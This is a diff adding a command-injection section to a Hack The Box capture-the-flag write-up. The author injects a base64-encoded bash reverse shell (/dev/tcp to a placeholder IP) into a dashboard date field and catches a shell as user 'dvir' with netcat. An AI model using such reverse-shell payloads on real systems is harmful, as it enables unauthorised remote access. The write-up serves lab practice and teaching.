@@ -102,3 +102,41 @@ is_admin; is_admin=ImFk**********************XpH0
 ```
 
 ![05-dashboard](https://github.com/amalcew/htb-writeups/assets/73908014/ef08bc73-4754-4860-9666-f92b96e5cbad)
+
+Nice! The dashboard allows to pass a date that is used to generate a dummy report. 
+
+### Command injection
+
+It took me a while to leverage this field using Burp Suite, but after some tinkering I've found out, that this field is vulnerable to command injection:
+
+![06-command_injection](https://github.com/amalcew/htb-writeups/assets/73908014/c6a58aee-2fed-4c4a-8705-d30695f31bfb)
+
+As we know the vulnerability, the next step is to gain access to the `dvir` user by spawning reverse shell. To do this we can use simple `bash` shell, encoded as base64:
+
+```bash
+> echo 'bash -i >& /dev/tcp/xx.xx.xx.xx/1234 0>&1' | base64 -w 0
+YmFz****************************************************Cg==
+```
+
+and passed in Burp as payload, with some URL encoding of the key characters:
+
+![image](https://github.com/amalcew/htb-writeups/assets/73908014/b3e95b10-26b1-4c0d-97b5-4d7a9c06717a)
+
+```bash
+> nc -lnvp 1234                                                  
+listening on [any] 1234 ...
+connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.8] 51764
+bash: cannot set terminal process group (1371): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.2$ id
+id
+uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
+```
+
+This was sufficient to read the user flag:
+
+```bash
+bash-5.2$ cat user.txt  
+cat user.txt
+c0****************************22
+```
